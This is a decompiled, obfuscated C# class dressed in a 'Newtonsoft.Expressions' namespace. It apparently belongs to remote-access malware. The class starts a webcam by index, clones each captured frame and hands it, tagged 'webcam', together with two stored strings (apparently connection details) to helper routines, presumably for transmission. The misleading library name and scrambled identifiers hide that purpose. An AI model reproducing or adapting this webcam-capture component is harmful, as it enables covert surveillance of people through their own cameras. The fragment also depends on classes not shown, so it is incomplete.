using GDBD.Bridges;
using GDBD.Importers;
using GDBD.Mocks;
using GDBD.Workers;
using Newtonsoft.Annotations;
using System;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;

namespace Newtonsoft.Expressions
{
	internal sealed class AdapterInstanceExpression
	{
		private static RoleEvent _Getter;

		private static string m_Setter;

		private static string worker;

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void SetEvent(int res, string pol, string dir)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			m_Setter = pol;
			worker = dir;
			if (_Getter == null)
			{
				_Getter = new RoleEvent(new AccountInstanceExpression(WrapperIssuerImporter.serializerEvent)[res].DisableInstance());
				_Getter.NewFrame += RateEvent;
				_Getter._0001();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static void RateEvent(object ident, IteratorIssuerMock visitor)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			DispatcherInstanceExpression.CustomizeFilter(ValClientBridge.PrepareList((Bitmap)visitor.DefineList().Clone()), "webcam", m_Setter, worker);
			Thread.Sleep(100);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static void RemoveEvent()
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			if (_Getter != null)
			{
				_Getter._0002();
				_Getter = null;
				GC.Collect();
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public AdapterInstanceExpression()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		static AdapterInstanceExpression()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			_Getter = null;
			worker = null;
		}
	}
}
